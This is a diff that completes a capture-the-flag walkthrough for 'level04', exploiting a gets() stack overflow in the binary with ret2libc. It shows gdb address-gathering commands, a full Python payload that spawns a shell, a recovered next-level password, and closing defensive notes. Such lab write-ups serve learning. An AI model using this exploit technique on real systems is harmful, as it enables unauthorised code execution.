@@ -2,18 +2,60 @@ Level 4 - Walkthrough
 ========================
 
 1) Recon
-- Files discovered:
-- Useful commands used:
+- Target binary: /home/users/level04/level04
+- Key behavior observed:
+	- Child process reads user-controlled input with gets().
+	- Parent process traces child and checks syscall number.
+	- Parent kills child when syscall == 11 (execve).
+
+Useful commands:
+- objdump -d ./level04
+- gdb ./level04
+
 
 2) Vulnerability confirmation
-- What is vulnerable:
-- Why it is exploitable:
+- Vulnerable line/path:
+	- Child branch calls gets(user_buffer) where user_buffer is fixed-size stack buffer.
+- Why exploitable:
+	- gets() allows overflow into saved EIP.
+	- Computed overwrite offset to EIP is 156 bytes.
 
-3) Exploitation steps
-- Exact command sequence:
-- Payload used:
+
+3) Exploitation steps (ret2libc)
+
+Step A - Gather runtime addresses in gdb:
+	gdb ./level04
+	set follow-fork-mode child
+	b main
+	run
+	p system
+	p exit
+	info proc mappings
+	find 0xf7e2c000, 0xf7fcc000, "/bin/sh"
+
+Example values used:
+- system = 0xf7e6aed0
+- exit   = 0xf7e5eb70
+- /bin/sh = 0xf7f897ec
+
+Step B - Build and send payload:
+	(python -c 'import struct,sys; sys.stdout.write("A"*156 + struct.pack("<I",0xf7e6aed0) + struct.pack("<I",0xf7e5eb70) + struct.pack("<I",0xf7f897ec) + "\n")'; cat) | ./level04
+
+Payload layout:
+- "A" * 156            -> reach saved EIP
+- packed system addr   -> overwrite EIP
+- packed exit addr     -> return target after system
+- packed "/bin/sh" ptr -> argument to system
+
 
 4) Result
-- Retrieved next password from:
-- Notes for defense/evaluation:
+- Retrieved next password from: /home/users/level05/.pass
+- Recovered value:
+	3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+
+5) Notes for defense/evaluation
+- Primary bug is unsafe gets().
+- Blacklisting only execve syscall is incomplete as a generic mitigation.
+- Prefer bounded input APIs and defense-in-depth (canaries, NX, ASLR, seccomp allowlists).
 
